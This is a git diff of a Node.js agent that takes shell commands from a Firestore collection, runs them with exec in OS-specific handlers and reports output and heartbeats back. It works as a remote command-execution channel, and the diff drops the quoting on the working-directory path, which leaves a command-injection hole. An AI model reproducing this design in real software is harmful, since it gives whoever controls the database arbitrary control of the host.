@@ -48,11 +48,15 @@ let endpoints = db.collection('endpoints');
                     // console.log('Command Data: ', change.doc.id, change.doc.data());
                     if (change.doc.id == ID && change.doc.data().lastCommandTime > lastCommandTime) {
                         lastCommandTime = change.doc.data().lastCommandTime;
-                        if (change.doc.data().command.includes('cd ')) {
-                            newOrder('(cd "' + change.doc.data().wd + '" && ' + change.doc.data().command + ') && ' + getCWD())
-                        }
-                        else {
-                            newOrder('cd "' + change.doc.data().wd + '" && ' + change.doc.data().command)
+                        switch (OS) {
+                            case 'linux':
+                                executeLinux(change.doc.data());
+                                break;
+                            case 'win32':
+                                executeWin32(change.doc.data());
+                                break;
+                            default:
+                                console.error('Unsupported OS');
                         }
                     }
                 }
@@ -71,17 +75,13 @@ function getUser() {
             return execSync('whoami', { maxBuffer: 1024 * 3000, encoding: "UTF-8" }).trim().split('\\')[1];
     }
 }
-function getCWD() {
-    switch (OS) {
-        case 'linux':
-            return 'pwd';
-        case 'win32':
-            return '(echo|cd)';
+const executeLinux = data => {
+    let order = `cd ${data.wd} && ${data.command}`;
+    let pwd = false;
+    if (data.command.includes('cd ') || data.command.includes('pwd')) {
+        pwd = true;
+        order = order + `&& pwd`
     }
-}
-// Execute command
-const newOrder = (order) => {
-    console.log(order)
     exec(order, { maxBuffer: 1024 * 3000, encoding: "UTF-8" }, (error, response, stderr) => {
         if (error) {
             commands.doc(ID).update({
@@ -96,16 +96,45 @@ const newOrder = (order) => {
                 success: true,
                 message: response
             }
-            if (order.includes('&& pwd') || order.includes('&& (echo|cd)')) {
+            if (pwd) {
                 responsePayload.pwd = response.trim();
                 responsePayload.message = '';
             }
-            console.log('Success:', responsePayload);
             commands.doc(ID).update({ lastResponseTime: Math.floor(new Date().getTime() / 1000), response: responsePayload })
         }
-    });
-}
+    })
 
+}
+const executeWin32 = data => {
+    let order = `cd ${data.wd} && ${data.command}`;
+    let pwd = false;
+    if (data.command.includes('cd ') || data.command.includes('pwd')) {
+        pwd = true;
+        order = order + `&& echo %cd%`
+    }
+    exec(order, { maxBuffer: 1024 * 3000, encoding: "UTF-8" }, (error, response, stderr) => {
+        if (error) {
+            commands.doc(ID).update({
+                lastResponseTime: getNowSeconds(),
+                response: {
+                    success: false,
+                    message: stderr
+                }
+            })
+        } else {
+            let responsePayload = {
+                success: true,
+                message: response
+            }
+            if (pwd) {
+                responsePayload.pwd = response.trim();
+                responsePayload.message = '';
+            }
+            commands.doc(ID).update({ lastResponseTime: Math.floor(new Date().getTime() / 1000), response: responsePayload })
+        }
+    })
+
+}
 setInterval(() => {
     endpoints.doc(ID).update({
         lastPing: Math.floor(new Date().getTime() / 1000)
